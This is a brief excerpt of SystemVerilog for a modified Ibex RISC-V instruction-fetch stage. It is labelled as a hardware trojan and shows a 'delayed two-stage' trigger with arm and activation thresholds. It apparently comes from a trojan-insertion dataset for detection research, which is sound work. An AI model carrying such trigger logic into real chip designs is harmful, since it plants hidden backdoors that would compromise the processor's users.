...
module ibex_if_stage_trojan_Integrity import ibex_pkg::*; #(
  ...
  output logic                        if_busy_o                 // IF stage is busy fetching instr
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=6432, act=3216)
    // ============================================================
    localparam int ARM_THRESHOLD   = 6432;
    localparam int ACTIVATE_DELAY  = 3216;
